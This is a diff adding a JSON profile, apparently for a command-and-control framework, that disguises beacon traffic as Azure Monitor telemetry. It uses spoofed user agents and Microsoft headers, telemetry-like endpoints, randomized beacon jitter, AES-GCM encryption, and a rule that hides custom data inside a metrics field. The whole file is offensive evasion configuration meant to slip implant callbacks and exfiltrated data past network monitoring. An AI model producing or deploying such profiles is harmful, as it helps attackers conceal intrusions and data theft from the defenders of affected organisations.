@@ -1,0 +1,50 @@
+{
+  "name": "azure_monitor",
+  "description": "Imitates Azure Monitor telemetry",
+  "user_agents": [
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+    "AzureMonitor/1.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+  ],
+  "endpoints": [
+    "/api/v1/telemetry",
+    "/v1/metrics",
+    "/data",
+    "/monitoring/collect"
+  ],
+  "headers": {
+    "Accept": "application/json",
+    "Content-Type": "application/json",
+    "User-Agent": "AzureMonitor/1.0",
+    "x-ms-version": "2020-10-01",
+    "x-ms-client-request-id": "{uuid}"
+  },
+  "parameters": {
+    "metrics": [
+      {
+        "name": "cpu_usage",
+        "value": "{random_float}",
+        "timestamp": "{timestamp}",
+        "properties": {
+          "host": "{hostname}",
+          "os": "{platform}"
+        }
+      }
+    ]
+  },
+  "jitter": {
+    "min": 60,
+    "max": 120,
+    "distribution": "uniform"
+  },
+  "encryption": {
+    "algorithm": "aes_256_gcm",
+    "key_size": 256,
+    "encoding": "base64"
+  },
+  "beacon_format": "json_array",
+  "data_transform": {
+    "method": "json_embed",
+    "field": "metrics[0].properties.custom_data"
+  }
+}
